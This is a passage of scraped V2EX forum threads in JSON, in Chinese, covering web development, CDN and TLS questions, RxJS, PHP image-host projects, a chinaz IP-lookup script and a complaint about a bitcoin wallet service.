src=\"https://raw.githubusercontent.com/fwon/blog/master/assets/electron-anyproxy-1.png\"></p>\n<h3>规则配置</h3>\n<p><img alt=\"pic\" src=\"https://raw.githubusercontent.com/fwon/blog/master/assets/electron-anyproxy-2.png\"></p>\n<h3>低网速模拟</h3>\n<p><img alt=\"pic\" src=\"https://raw.githubusercontent.com/fwon/blog/master/assets/electron-anyproxy-3.png\"></p>\n<h3>接口 Mock</h3>\n<p><img alt=\"pic\" src=\"https://raw.githubusercontent.com/fwon/blog/master/assets/electron-anyproxy-4.png\"></p>\n</div></div>"], "reply": "18", "tittle": "Electron + Vue 实现一个代理客户端", "comment": ["酷", "这波阔以", "cool", "界面还是不够还看。\r", "别人拖几下就好看了。", "楼主的对 http 的理解很透彻", "可以，支持一波", "点赞， star,文章质量不错。", "赞", "windows 能用？", " 可以的", "马一下以后玩！", "支持 https 么？证书。", " 支持的哈", "求教 用的啥子 ui 库?", " 用了 Element ", "厉害了，是不是类似 fiddler 的东西", "棒棒, fork 一波", " 嗯，同类型的，功能更接近 Charles"]},
{"content": ["<div class=\"topic_content\">如题，求助 V 友，搭建一个个人展示用的 web 网站，浏览量不会很大，国内现有的云服务商，用哪家的更好呢？\r<br>\r<br>比如价格或者性能、拓展服务等等几个方面，真诚请教</div>"], "reply": "10", "tittle": "搭建一个个人展示用的 web 网站，用哪家的云服务更好呢？", "comment": ["腾讯云", "阿里云", "不要 用网易蜂巢，很坑爹", "腾讯云", "腾讯云", "展示用的？ 有数据库没有 没数据库的话 随便找个托管静态页的就行", "腾讯云", "百度 bae ，", "GitHub Pages 不要钱 😝", "树莓派"]},
{"content": ["<div class=\"topic_content\">加密内容肯定是不能缓存，那 CDN 就类似反向代理， CDN 也能看到私密数据，同时 CDN 和源服务器之间也存在数据保密问题。这些都不重要还是我理解有问题？</div>"], "reply": "9", "tittle": "对于 SSL/TLS， CDN 实现缓存和加速的原理是什么？", "comment": ["你要给 cdn 一个你的 ssl 证书\r", "这个证书用于和客户端加密\r", "然后 cdn 回源的话是直接向你服务器请求数据，如果走 https 的话， cdn 到服务器之间也是加密的", "cdn 当然能看到你传输的数据.....信任问题了", "CDN 可以看到数据， CDN 和源之间的连接也可以是加密的", " 之前没有提到，还有一个疑问就是 SSL private key 。如果 CDN 除了服务器证书，还需要把证书私钥保存在自己平台上，这本身就可能有安全问题。", "Cloudflare 的 Keyless SSL 就是解决私钥保管的问题，既不需要把私钥保存在 CF 的服务器上，也不用 CF 以你的名义申请私钥。\r", "不过 CF 的服务器应该还是能看到解密的数据，只是每次(指每个 session ，不是指每个 request)要问 key server 解密一下 secret ，获得解密的 secret 之后只能在 session 限定的时间内与用户通讯（ 5 分钟到 48 小时）。", "CDN 能看到你的数据的。如果对安全要求高，内容文件不要放 CDN 。如果对安全要求不高，记得用 SRI 防篡改。", "CDN 就是一个中间人，解密数据，保存下来，然后再用你提供的证书加密。", "8 楼正解。\r", "\r", "假设你的使用方式是让用户想要某一资源的时候请求 CDN ， CDN 发现自己没有缓存就去请求你的文件源，请求到就在 CDN 上缓存了一份文件，再把文件传回给用户，下次再有用户访问这个文件的时候， CDN 即可立即返回自己缓存的文件。\r", "\r", "这个过程中建立了两个连接，分别是 用户-CDN 和 CDN-文件源服务器，这两个连接通常是两个独立的 HTTP 连接，如果使用了 TLS 协议的话就是两个独立的 HTTPS 连接，在文件返回的过程中，文件先在文件源服务器加密，传给 CDN ，然后 CDN 解密，缓存下来，再加密，传给用户，用户解密，使用内容。其实就是两次标准的 HTTPS 传输过程。"]},
{"content": ["<div class=\"topic_content\">他们的 token 是在线生成的，就像他官方给的例子， token 固定且放在页面上，这岂不是任何人都能往他相册里传图片</div>"], "reply": "4", "tittle": "贴图库的 api 好奇怪", "comment": ["登录账号才能看到 token 的呀。", "这个应该是前端提交请求给后端，后端通过 token 上传，所以不公开展示\r", "（我猜的", " 万一被别人知道 都没办法 revoke", "每个账号看到的 token 是不一样的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>面向 Symfony 新手的东西，也不算是教程，其实就是每步的命令的罗列而已。</p>\n<p>方便快速体验和日后查询。</p>\n<p><a href=\"https://www.domyself.me/2017/04/09/create-a-simple-blog-in-5-minutes-with-symfony-easy-admin-bundle.html\" rel=\"nofollow\">https://www.domyself.me/2017/04/09/create-a-simple-blog-in-5-minutes-with-symfony-easy-admin-bundle.html</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Symfony3 快速搭建简易 CMS 后台", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>假设有一个输入源，后面接 throttle 操作符来控制输出的时间间隔，像这样</p>\n<p>var clicks = Rx.Observable.fromEvent(document, 'click');\nvar result = clicks.throttleTime(1000);\nresult.subscribe(x =&gt; console.log(x));</p>\n<p>另有一路输入源是突发型的，来了之后不受 throttle 的限制，直接向后输出，并且能重置之前普通输入源在 throttle 里面的计时器，请问这个需求该怎么实现呢？</p>\n</div></div>"], "reply": "12", "tittle": "Rx 问题一则", "comment": ["不太明白，能不能讲一讲什么场景", " \r", "是要发送一个同步信息用的网络请求，一般情况下一小时请求一次就够了，采用某种同步方式来触发（比如所有的点击事件），所有一小时间隔以内的触发都屏蔽掉，但是有某个按钮在点击后必须立即发送这个网络请求，这次请求完成后，也是在之后的一个小时内屏蔽掉其它的普通触发", "var buttonA = ...\r", "Rx.Observable.fromEvent(document, 'click')\r", "    .throttle(ev => Rx.Observable.interval(ev.source = buttonA ? 0 : 1000))\r", "    .subscribe(x => console.log(x));", " \r", "好像不行，这个 interval 只能设定往后时间的定时器，也就是说普通触发往后一秒无论如何都会被锁死，普通的和特殊的都是，而反过来特殊触发之后的任何触发都会被接受，也是普通的和特殊的都是", "```\r", "Rx.Observable.interval(1000).takeUntil(\r", "Rx.Observable.fromEvent(document, 'click')\r", ".throttle\r", ".flatMapLatest (Rx.Observable.interval(1000))\r", ")\r", "```", "先建一个定时器，然后每次点击会产生一个新的定时器，废掉最开始的定时器， takeUntil 是从 RxSwift 里面找的， Emits elements from a source Observable sequence until a reference Observable sequence emits an element.\r", "你可以看下对应功能 RxJS 里面的 operator 。 代码你要修改一下，只是大概表达一下思路", " \r", "非常感谢啊，这样说起来的确有些思路了，但是废立定时器和 throttle 怎么结合还是有点不明白，能再具体些吗？", " 可以用 sample ，和 throttle 的差别是一个是定时触发，另一个是阀门（触发时间接近严格等于事件源时间）\r", "\r", "先建一个可干预的定时器\r", "\r", "var timer = new Rx.Subject();\r", "Rx.Observable.interval(1000).subscribe(timer); // 每秒触发一次\r", "Rx.Observable.fromEvent(buttonA, 'click').subscribe(timer); // button A 按下也触发一次\r", "\r", "// 用这个可干预的定时器来控制事件触发频率\r", "var result = timer.sample(Rx.Observable.fromEvent(document, 'click'));\r", "result.subscribe(x => console.log(x));", "还是有一点小问题，但不难修正\r", "就是让 buttonA 按下的同时，不但要给 timer 推一个事件\r", "还要 unsubscribe 掉之前的计时器, 重新 subscribe 一个新的计时器\r", "以确保时钟要重新计算", " takeUnti 相当于废掉最先的那个 Rx.Observable.interval(1000), flatMapLatest 会废掉这次 click 之前，也就是上一次 click 生成的 timer （这个 timer 能马上执行一次，并间隔执行，需要自己替换）， throttle 只是改变了 click 生成 timer 的频率，跟废除 timer 没关系", " RxSwift 大神？", " \r", "嗯，谢谢，不过最好能一气呵成，更 rx 些，其实考虑 unsubscribe 的话，直接在特殊触发后废立一次 subscription 就好了\r", "\r", " \r", "请问能用代码演示一下吗？因为之前的代码里没有出现特殊触发事件，假设普通触发是 fromEvent(buttonPlain, 'click')，特殊触发是 fromEvent(buttonSpecial, 'click')这样"]},
{"content": ["<div class=\"topic_content\">![]( <a target=\"_blank\" href=\"http://i2.muimg.com/567571/620945a67e12f886.jpg\" rel=\"nofollow\">http://i2.muimg.com/567571/620945a67e12f886.jpg</a>)\r<br>\r<br>这是 jenkins 的 pipeline 效果， 只用 css 和 html 可以实现吗？\r<br>\r<br>主要是如果不断的加新的内容进去 它可以自动的换行</div>"], "reply": "2", "tittle": "这个效果前端该怎么做？", "comment": ["这不是动态操作 dom 么", "我不太清楚这个 css 该如何定位，。\r", "\r", "因为这个层数是无限多的， 这个 css 该如何实现呢？ 每一层都有一个 css 类吗？ 其次它可以向下扩展，应该如何实现？如何让他转到下一行呢？\r", "\r", "jquery 的操作 这个我能完成， css 这个定位 布局 就不行了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在直播页面看到 video 标签的内容为：\n[ video src=\"blob:http%3A//<a href=\"http://www.huya.com/3d381239-3c11-404b-a58a-bbcf490b1e99\" rel=\"nofollow\">www.huya.com/3d381239-3c11-404b-a58a-bbcf490b1e99</a>\" autoplay=\"\" id=\"hy-video\"]  [/video ]\n预览主题发现用尖括号括起来会看不到，就用 [] 括起来了- -||\nsrc 里的 Url 问出错，也没法调用 ffmpeg 录制</p>\n<p>原本的方式是通过在 header 中指定 IOS 版本浏览器来访问直播页面，就直接能在页面代码中获取 m3u8 来录制，现在这个方法时灵时不灵，看了一下受影响的大概都是改版后有“蓝光”清晰度的主播</p>\n<p>请问是否有其他方式获取直播源，求诸位高手开导</p>\n</div></div>"], "reply": "13", "tittle": "虎牙最近改版很多主播有了“蓝光”清晰度后无法获取直播源，求开智", "comment": ["直播都有蓝光的，。。", " 他把那一档清晰度叫“蓝光”而已。。。其实。。。你懂得", " 现在视频都是瞎标的，超清都没正在高清清晰，没多久估计还会出一个会出超级蓝光", "为什么虎牙一哥 longdd 的超清 就跟打了马赛克一样..", " 就当\"超清\"是一个纯粹的 tag ，不能按字面含义理解", "蓝光需要充钱才能看吗", "直播链接请求，一般都是要加上类 token 的校验值的", "绑定；同学都问我：你下的蓝光怎么都好几十 G?我看 PPTV 的时候不用多少网速啊！", " 谢谢，这个我大概知道，然后还略有所知比如需要用时间戳和 GUID 什么的生成 key 之类的，只是没有详细了解的途径，所以来求助的- -\r", "在逆向了它的 swf 之后好像有发现一些东西但是又不知道从何入手", "只需找到这样的代码: new MediaSource(src)", "我记得去年腾讯只准斗鱼直播的那个德玛西亚杯，搞的什么 4K 直播，配合上腾讯一贯的垃圾制作，效果还不如 Riot 官方的普通 720p", "两个事件：\r", "1. 爱国者 MP5\r", "2. 某雷在网上推出了高清视频，后又推出了超清视频，然并卵，超清还比不上油管 720P 。\r", "\r", "厂商爱用概念误导不是一天两天了。直播的清晰度选择本来就是照顾大多数人的感觉，和视频点播站的清晰度最好一一对应，这样大家都容易理解。", "油管的 720P 真是清晰，业界一股清流，下下来得有 2500K 的码率，编码估计以后要用 HEVC 体积更小，品质更高了"]},
{"content": ["<div class=\"topic_content\">感谢各位对我这个帖子的关注和回复！领导刚才又提了个需求，说要求付款方式除了信用卡以外都行。。代理商只要是大牌的稳定的就行，再次感谢各位！</div>"], "reply": "6", "tittle": "公司想做国外服务器的销售代理，要求控制后台为中文，求推荐靠谱服务商！", "comment": ["最成熟的还是 WHMCS ，中文可以设置。没问题。 VPS reseller 一大堆。", "前几天 LET 看到有人拿 ATOM 330 的机器做母鸡，在开小鸡买。希望 lz 做个有良知的商人。", " 看到母鸡和小鸡觉得好喜感 233", "去 hostloc", " 我想做好人，领导想不想可就不一定了 2333333", "要哪里的机器？美国日本和澳洲的可以联系我们"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前几天注册了个币信账号（没错，就是酷工作里天天置顶那个），给里面充了 0.002 个币（还好没多充），我也就是试试。\n然后，我打算把币转到另一个钱包里去，结果告诉我：</p>\n<pre><code>您最近对账号设置进行了修改,为了您的账号安全,暂时锁定您的交易功能。锁定将在 25 小时后结束。\n</code></pre>\n<p>搞什么名堂，我就联系客服，过了一天，客服回复了：</p>\n<pre><code>您好，您修改密码或者手机号之后为了您的账户安全都会对您的账户进行锁定。望您知悉。解锁方法-为了保证账户安全，请按以下格式 [创建工单] ，标题：申请解除账号锁定 详情： 您的登录账号，并上传您本人手持身份证照片（需为申请当日拍摄，不得与注册账户时提交照片相同），通过审核后，我们将解除您的账号锁定。\n</code></pre>\n<p>要证件照，那我再等几个小时。</p>\n<p>今早再去看，应该能提现了吧，结果还要手持证件照：\n<img alt=\"\" src=\"https://ws2.sinaimg.cn/large/006bQNKbly1fehexyti52j31kw0w9tov.jpg\"></p>\n<p>想想还是算了，这点币就当喂*了。</p>\n<p>再附两张图对比一下:\n这是币信的\n<img alt=\"\" src=\"https://ws2.sinaimg.cn/large/006bQNKbly1fehfhp59ucj313m0d6k0a.jpg\">\n这是 BTCC 的\n<img alt=\"\" src=\"https://ws2.sinaimg.cn/large/006bQNKbly1fehffqgkhmj315s0ciaby.jpg\">\n另外 BTCC 比特币提现不需要证件照。</p>\n<p>我的工作不涉及比特币，发帖也不是为了给 BTCC 打广告，只是看不惯广告吹上天，服务却 Low 的一逼。\n欢迎各位 V 友推荐更好的平台。</p>\n</div></div>"], "reply": "50", "tittle": "垃圾币信", "comment": ["如果使用没有资金掌控权的链下钱包，为什么要用 Bitcoin 呢\r", "\r", "币信的目标客户是小白", " #1 是啊，这些交易所炒作比特币，坑的就是小白", " #2 按现在的价格 8000*0.0005 ，交易一次就被交易所吃掉 4 元", " 拥堵的时候你不给高手续费你看看矿工给你确认不。。。", " 不过我有一半的币在比特币中国变假币了。。。", " 变假币是什么意思啊", " 交易所没有实际的比特币承兑，只是网站数据库里的一串数字", " 现在三大都不能提现 btc 、 ltc 。", "原来币信就是之前好比特币改名的，还以为跑路了。", " 嗯嗯，这个知道。也不知道会停止提现到啥时候", "比特币为啥要实名", "然而 BTCC 早就不能提币鸟", "他们怎么置顶的 隔几天刷下？ 看得烦 b 掉了", "早已将币信 block ，看着烦", "这种为黑而黑没什么意思吧？\r", "\r", "1 ）在你账号状态发生改变的情况下，对账号进行短时间冻结以防黑客操作是为了保护用户资产安全，这是业内一个常规的做法；\r", "2 ）实名认证是监管机构对所有比特币平台的基本要求。\r", "\r", "至于 BTCC ，\r", "1 ）同样要做严格的实名认证；\r", "2 ）目前 BTCC 甚至不能提币。\r", "\r", "不知道楼主有没有同样充值 0.002 去 BTCC 试试？", " 可以转到别的钱包，再通过场外交易卖掉", "![TIM 截图 20170410133136.png]( ", ")\r", "\r", "挺尴尬的!", " 怎么能做到？求教~", "别的不说  置顶看的烦。。。。", " #17 把比特币转到 ", " 然后卖掉。我的币也是在那买的，支付宝转账给卖家，卖家把币转到你帐上，这个没有第三方担保，主要靠信誉。", " 哦！谢谢！我以为你是有办法从 BTCC 里把币给弄出来呢。。。。", "早就屏蔽了", " \r", "\r", "接着 @", " 的回复补充一下：\r", "1.转币手续费不是给交易所的，这个是区块矿工费。\r", "2.币信 app 也有 otc 群，若你觉得转币手续费贵，完全可以在群里面卖掉。", "1.当前比特币转币最佳手续费可以参考这里： ", "   目前来说的话是 0.0011 左右，强调一下，这个不是给交易所的，不管是币信，还是 btcc 。\r", "2.修改资料冻结期和认证，这个是风控手段，都需要的。至于你觉得转币手续费高和卖币问题，可以考虑一下币信担保支付， otc 群卖币流程： ", "\r", "3.祝你愉快。", " #23 \r", "0. 我说的是事实，并没有为黑而黑\r", "1. 交易费，你可以参考 BTCC 和 ", " 的实际数据，大概是 0.0002 多一点点  ", "  \r", "2. 我把币转到别的钱包，为什么要进你的 QQ 群交易？别的平台为啥不需要冻结？\r", "3. BTCC 提现需要实名，转币不需要，我已经用过了", "没接触过，想问一下  0.002 个币 约等于当下多少 RMB ?", " \r", "  \r", "\r", "是有 escrow service 的\r", "比如你转钱给对方，对方收到钱不放行 BTC ， 60 分钟就可以 dispute ，处理速度比币信所谓的 14 天快多了，看到 Bixin 就烦", " 17", " #24 补充刚没看仔细， QQ 群 -> 币信群。问题不变，我把币转到别的钱包，为什么要进你的群交易？", "整天在 V2EX 置顶有这个必要吗\r", "还有以前有个卖乐视账号的，也是整天置顶", "为什么它能置顶", " \r", "\r", "1.交易费参考 btcc 没意义， btcc 现在无法提币， btcc 的手续费是 2 月未禁止之前设定的；\r", "   币信是一直可以提币，现在区块比 2 月份拥堵多了，确保发币速度手续费，就务必参照当前区块最佳手续费，最佳手续费看这里 ", "  ；手续费： 0.0012 ； blockchain.info  你也多刷几次，不能单看一次。\r", "2.我们纯粹转币也不需要实名，之所以要实名，是因为你修改了资料，从安全的角度来说，这个情况必须要实名。\r", "3.不是要你去 otc 群交易（不是 qq 群），是在你“不想实名认证”的前提下给出的解决方案。", " #31 找到你们的直接转币功能了，不过手续费不敢认同。\r", "这是我在 BTCC 的提现记录：\r", " ", " ", " \r", "\r", "btcc 能提币了吗，还是极付钱包的？\r", "\r", "手续费给足速度快，手续费给少速度慢，当然这个和发币者对于速度的需求有关，根据需求选择合适的。\r", "币信是钱包，即时自动发币，站外发币务需按给足手续费，站内发币免手续费。", "没玩过币信\r", "不过我有个疑问，玩比特币如果还要实名 谁 TMD 敢玩", "btcc 更恶心， qq 视频手持证件照， f**k ，公安部银行都没这么干过\r", "\r", " #35 世界上没有一个交易所不需要实名，比特币本身交易信息全公开，要定位到你太容易了", "平台规则我觉得没什么好黑的，别人怎么规定都是合理的\r", "\r", "我觉得黑点是币信在 v 站长期置顶帖子根本不是想招人，而是精准投放广告，细思极恐。", "仔细看那人发帖记录，一年里每个月都发帖，置顶，频繁宣传他们的平台。一年都没招够么，呵呵。\r", "\r", "另外 v 站置顶成本很小，真是廉价广告。", "修改密码居然锁账户？什么逻辑？\r", "任何一家网上支付公司都不可能做这么脑残的设计吧。", "1. 包括 BTCC 在内的国内交易所现在没法提币\r", "2. 链上交易手续费没万分之几的了\r", "3. 比特币企业招人难，说为了打廉价广告才每个月发帖实在想太多，楼上有些人实在屌丝的一匹，这个行业缺人不缺钱", "不管怎么说，这么点事情就说人家“垃圾”总感觉不大合适。估计楼主是基于对置顶的厌烦感吧，但事情一码归一码。", "BTCC 一样需要手持身份证照片.\r", "数得上名字的平台都不能提币,法克.", "我和我老婆同时收到了币信开通手机验证码（我俩连号，且我俩一点 BTC 都不碰）\r", "\r", "所以，我当时就觉得币信刷用户量有点 low B （当然，不知道现在是不是主流做法就是这样。。。", " 能卖我点币嘛?", "为什么不去国外交易所，这东西实名了不如炒股？", " 额 感觉有点麻烦，去 localbitcoins 买应该就行吧，直接邮箱注册，其它都不要", "    这个不大可能吧，我们干不出这样的事情，不知你方便私聊一下我看具体什么情况", " 这里我解释一下，比特币钱包和人民币钱包（第三方支付）还是有点不一样，第三方支付修改资料转移资产的话是转移到银行卡的，这可以直接追溯；比特币钱包修改资料转移资产是无法直接追溯到具体人的，所以比特币钱包一般修改资料都会 24 小时或 48 小时锁定不能使用，过了这个时间点就可以使用。", " 的确是一直在招人，也陆续在 V2EX 找到了同事，给大家带来的困扰说声抱歉了，根据大家的反应，接下来招聘帖也不会一直置顶了。抱拳抱拳", " 安慰下你，当年 100%的比特币在 mtgox ，个人认证问题，没提出来，就不了了之了～～"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://diviac.com\" rel=\"nofollow\">diviac.com</a>   一个国外预定网站，想搭建个类似的网站，需要什么平台实现，请人修改的话大概费用多少，请知晓的大神解答下，非常感谢</div>"], "reply": "13", "tittle": "请教下这个国外网站用的什么系统建成", "comment": ["你可以去卖网站模板的网站看看，基本是这种风格", " 他这个主站不知道是国外什么程序做的，一个子站我看到用的是 wordpress", "如果是定制，估计没个两三万搞不定，如果是有这样的模版，类似 wordpress 的主题，估计也就几百块钱可以买到", "他这个应该是自己写的，看了下某个测试 Addon 显示 django ？\r", "\r", "印象中没有这种的平台，可以考虑用个网店先凑活着", "   wordpress 的英文旅游预订主题好像达不到他这个效果", " 我也感觉他们做这个平台他们还是花了点心思，主站的内容想采集都难 \r", "另外帮忙看看国内这个站 innfins 点 com  也是模仿他们家的 ，用的什么系统，谢谢", " #6 这种公司多半都是自己做，没什么系统的，这家是 PHP\r", "\r", "他们不是采集，是专门有内部订票系统的接口，我有个朋友做订票行业的知道这些。", " 如果用 WordPress 的话，需要修改一下才能满足需求吧，如果是公司核心业务，倒是建议找人开发一套了。", "基于 Angularjs  框架搭建的", " 都没听说过这个框架，看来比较复杂 ，谢谢你", " 新开发一套代价太大了，最好在现成的系统基础上小幅度修改达到使用的目的最好，如果 WP 基础上能修改实现的话请人修改大概需要多少 RMB", " 我说的采集是国外那个站的数据采集，他们那么搞是连搜索引擎爬虫都挡住了", " 看需求以及要改多少了"]},
{"content": ["<div class=\"topic_content\">演示地址： <a target=\"_blank\" href=\"https://famio.liew.io\" rel=\"nofollow\">https://famio.liew.io</a>\r<br>Git ： <a target=\"_blank\" href=\"https://git.oschina.net/famio/wocreat\" rel=\"nofollow\">https://git.oschina.net/famio/wocreat</a>\r<br>\r<br>出于自用的目的，又找不到心仪的程序（我就是想要简单点的功能……），然后当成 PHP 学习的练手品了。\r<br>正在学习 ajax ，前辈们请轻喷。</div>"], "reply": "35", "tittle": "自己写的开源 PHP 图床程序", "comment": ["建议加个拖拽\r", "1.加拖拽； 2.加多图上传； 3.后台格式和大小控制、启用、删除； 4.后台更换图片地址", "感谢分享～", "建议加个粘贴上传图片", "建議改為響應式佈局，移動端會好看點=.=", "我也来一发： ", "\r", "为什么传了个图，是个下载链接。", " #7 目测是用了对象云存储之类的服务，然后头没设置好", " @", " 因为我给的链接是去掉文件扩展名的，等会儿修复下", "\r", "和你的想法一样的短链接程序，但是做的很糟糕，就不开源了", " 你这个域名到底属于什么后缀的。。。", " ", "\r", "某公司的后缀", " 发车猝不及防啊", "我用 Node.js + React 写了一个，欢迎提建议\r", " ", "搭个车　　 ", " 页面不刷新，但是浏览器地址改变，您是怎样实现的？", " pushstate", " 前端路由啊", " \r", " \r", "非常感谢，有空我试一下。", "安利一发 ", "不是说不能写裸 php ，基本的 mvc 分离都没有，再加上这几乎没有的逻辑（有效 php 才几行），我觉得也就只能算个 hello world 吧", " 当然，我承认的。我本来就不会 php", "搭车， ", "  有权限控制，可以从前端将浮层干掉，但接口还上传不了，可以试试交互；使用 vue2 + eggjs + element-ui ，支持拖拽，有进度条， js ， css 文件支持压缩和 combine ，存储选择的是 qiniu ，返回链接支持 https 和 http ，网站使用 http2", " 来一个多文件上传，比如 100 张，你这个轻量级就真的是完美了。至于其他人说的那些类似捡了个鼠标就想要开网吧的事就不用考虑了。我支持你。", " 謝謝朋友。\r", "你的話猶如黑夜中的一束光。", " #10 一个报错就把你的物理路径爆出来了 233...d:\\freehost\\lslqtz\\web\\shorturl\\49", " 改了下，用了个上传插件，移动到七牛和腾讯等 oss 里了", "  不用客气。我至今还用的 QCHAN ，一个只能传到本地空间的小图床程序，满足自己的需求就好。哈哈，更主要的是因为我不懂怎样配置到又拍云之类的存储上。\r", "\r", "总之你加油，初心最重要，就像你说的“自用”，那就别管别人的看法了。", "等了一分钟终于把视频上传到 100%，然后：\r", "8 年前或者不知道多久前寫的：\r", "自己用的图窗，没维护 yun.junbaor.com/tu", " 你这个图床好眼熟，用的什么开源程序么", "安利一个 ", " ，可以跑在 openshift 免费空间上的。", " 上传插件 dropzone,极简图床的 nav,还有个啥图床的 footer,用的七牛 base64 上传", " 能分享不"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://ip.chinaz.com/\" rel=\"nofollow\">http://ip.chinaz.com/</a></p>\n<p>看到下面的：“获取代码：把下面一小段代码加到你的主页中即可在您的网页上中显示来访用户的 IP 及其地区！”</p>\n<p>里面 js 的 url打开是一串 json ，我就想问问 chinaz 给我一串 json ，我该怎么用？而且服务器返回的 response header 也没有允许跨域使用，你给个 jsonp 不行么？官网还大大方方的贴在首页，不怕被业内人士贻笑大方么？</p>\n</div></div>", "<div class=\"topic_content\">好吧，我直接打开 script 的 url ，看到结果就开喷了，没有在实际网页中插入这个 script ，是我的错，能删帖么</div>", "<div class=\"topic_content\">另外，这串 js ： <a target=\"_blank\" href=\"http://ip.chinaz.com/getip.aspx\" rel=\"nofollow\">http://ip.chinaz.com/getip.aspx</a> ，应该是根据 http_referer 来返回不同的结果，在实际插入网页中会多了一个 document.write ，不过写了前端这么多年， document.write 一个 json ，这么先进的编写方式我还是第一次遇到，估计我的代码水平真不如下面嘲讽我的人吧</div>"], "reply": "74", "tittle": "有点搞不明白， Chinaz 的 ip 查询代码在调戏用户智商？", "comment": ["它没有让您打开 URL 啊，而是要带着 script 标签整个放到页面源码中。\r", "\r", "没有任何问题。", ".....这也能喷？？？", "。。。。。。\r", "不是把这段脚本粘贴放置在需要的网页下方吗？\r", "<script type=\"text/javascript\" src=\"http://ip.chinaz.com/getip.aspx\"></script>\r", "\r", "嗯嗯，确实是低估了用户智商了", "楼主你上小学几年级？", "角度刁钻。。。", "2333333", "楼主真是要被贻笑大方了~~", "站长： MDZZ", "楼主这个智商基本告别了程序猿", "高估用户智商了。。。", "第一反应我以为是我没睡醒", "这特么就比较尴尬了...", "楼主，捂脸，逃", "楼主是缺铜币了吧", "我特么差点  笑死了  是真的", "LS 们，那段 html 只能在网页里显示一个 json 字符串，这才是楼主的意思", "我想了想，楼主应该是刚学了 json 吧", "可以围观一下吗？\r", "容我先笑一会！", "V2EX 不能删贴的，我觉得这点非常好。说出去的话泼出去的水，所以说话前要慎重。", "我试了， chinaz 的代码可能确实有点问题，用 script 标签的方式引用会返回：\r", "\r", "document.write(\"{ip:'xx.xx.xx.xx',address:'xx 省 xx 市 联通'}\")\r", "\r", "而这段代码在界面上就成了一段 JSON ，和预期的效果并不是很符合。", "生词本写完了？", " 在我这里都只是返回了一串 json ，不知道是不是因为本地 html 测试的原因，都没看见 jsonp ，很奇怪。", "角度刁钻", " 我测试了一下，本地 html 只返回 json ，在服务器上访问是 document.write(\"{ip:'xx.xxx.xx.xxx',address:'xxxx'}\")", "\r", "好的，看来他们是检验了下相关的参数返回不同结果的了，不过不是返回自定义的 jsonp 太难看了", "错就错了，还继续钻牛角尖嘲讽别人，不地道。", " 我也觉得不正常，不如提供一个 jsonP 的更加方便。", "我来看热闹的", "装逼失败", "诚然， chinaz 是有不当之处，但是这帖子将成为楼主你永久的黑点。", "又要开新号了，这个号基本废了", "document.write 的写法并不像楼主补充中说的那么不可理解吧\r", "楼主不要忘了，这个域名被访问的时候，访问者并不一定是终端用户的浏览器，还有可能是一些自己写的爬虫......", "补充一下，从代码语义上也说得通，<script type=\"text/javascript\" src=\"......\"></script>输出一个 js 片段，语义是合理的。而输出一个 json 对象么，不觉得难看？", "所以这个站就被大家玩儿坏了？\r", "\r", "打不开了，提示请联系站长 QQ ……", " \r", "document.write 直接把 json 写出来是不是有点太那个了？\r", "难道还要写进去个标签 再把 json 读出来用？", " 我也来挑一下刺哈，“贻笑大方”前面不需要加“被”，这个成语表示被人取笑的意思", "每次遇到这样的帖子都庆幸 V2EX 不能删帖。", "今日最佳 doge", "这个是支持 jsonp 协议的。。\r", "$(document).append('<script type=\"text/javascript\"  src=\"http://ip.chinaz.com/getip.aspx?callback=t123\"></script>')\r", "\r", "t123({ip:'',address:''})", "文档没写支持 jsonp ，这个 chinaz 肯定做得不够好了\r", "\r", "但 LZ 说自己都做了那么多年前端了，经验总会有吧，试试加个 callback 参数不用多少时间", "震惊！ Chinaz 的 ip 查询代码在调戏用户智商？！", "喵喵喵？", "你就算喷它用 iis+aspx 黑你的人也不会像现在这样", " 哈哈，谢谢提醒~", "非 web 开发人员表示看不明白，求说破的。", " 我每次发帖之前都查查自己用词是否准确😂😂😂", " \r", "chinaz 使用说明：把那个盒子拿过来，里面是方便面，可以吃\r", "楼主的使用方法:把盒子打开，把里面的料包拿出来问这有什么用，又不能吃，智障吗，我难道还要自己准备面", " 确切一点的话楼主应该拿着面饼和料包问这怎么吃，碗呢", "没必要嘲讽楼主。\r", "我的反应也是这样，只能说楼主没多测试。\r", "而且站长这样做本来也是不太正确的，因为有些站点会禁用 Referer ，其次这个似乎是直接 write 出了 json 。\r", "而且关于其它协议没有做详细的说明，所以我不觉得楼主有什么问题。", "看了一下楼主的回复我觉得不能怪楼主", " 专业", " 我也看了下回复，所以补充一下我之前的回复：仅针对这个问题。", " 我是真心请教你一下，这个 chinaz 的代码该怎么用？比如我想实现一个效果，在客户端浏览器显示：您当前的 IP 为： xxx.xx.xx.xxx,位于 xxxx ，通过 chinaz 的这段 js 怎么实现？小白请教一下，如果不行的话，您可不可以承认自己智障呢？", "我觉得楼主说的一点毛病没有\r", "\r", "上面几乎所有嘲讽楼主的都没看问题么\r", "\r", "\r", "根据 chinaz 的说明和延时是这样的 上面是代码 下面是效果\r", " \r", "\r", "\r", "实际我把这段代码 copy 到我的网站是这样的\r", " ", " 谢谢纵欲看明白了，我看 lz 的帖子当时也觉得奇怪，发现一群人喷他，当时还站在 lz 一边。", " 你要的用法\r", "\r", "\r", "代码在这里（晚饭后出来散步，看到这个帖子，实在看不下去，一半是手机编辑的，所以格式有点乱）\r", "我想说就算 document.write 了\r", "你直接 js replace 不就完事了\r", "高中生路过， js 自学了一个网上改完之后发现楼上有更好的正解\r", "\r", "准运维表示楼主垃低了我心目中前端的智商水平", " 现在小孩子都这么毒吗", "Content-Type: text/html; charset=utf-8\r", "喷吧", "html 部分↓\r", "<div class=\"aa\"><script type=\"text/javascript\" src=\"http://ip.chinaz.com/getip.aspx\"></script></div>\r", "js 部分↓\r", "var sss=$('.aa').html().replace(/<script.*script>/ig,'')\r", "console.log(eval(\"(\"+sss+\")\").ip)\r", "console.log(eval(\"(\"+sss+\")\").address)", " nice", "想不通为什么回复的人大部分用一种非官方解决方案去嘲讽 LZ  我去看了一下 ", " 的源码 他们甚至自己演示的代码展示效果都是直接渲染到页面中的 很明显 “把下面一小段代码加到你的主页中即可在您的网页上中显示来访用户的 IP 及其地区！” 是一种极大的误导啊 虽然说技术手段解决这个问题不是问题 